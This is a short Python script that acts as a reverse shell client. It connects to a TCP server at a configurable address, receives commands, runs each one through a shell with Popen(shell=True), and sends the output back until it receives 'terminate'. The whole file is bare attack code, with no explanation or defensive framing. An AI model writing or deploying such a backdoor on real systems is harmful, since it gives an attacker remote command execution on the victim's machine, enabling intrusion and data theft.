import socket
from subprocess import Popen, PIPE

server_ip = '127.0.0.1'
server_port = 8080

def connect():
    so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    so.connect((server_ip, server_port))
    while True:
        command = so.recv(1024)
        if 'terminate' in command:
            so.close()
            break
        else:
            CMD = Popen(command, shell=True, stdout=PIPE, stdin=PIPE, stderr=PIPE)
            so.send(CMD.stdout.read())
            so.send(CMD.stderr.read())
def main():
    connect()
main()
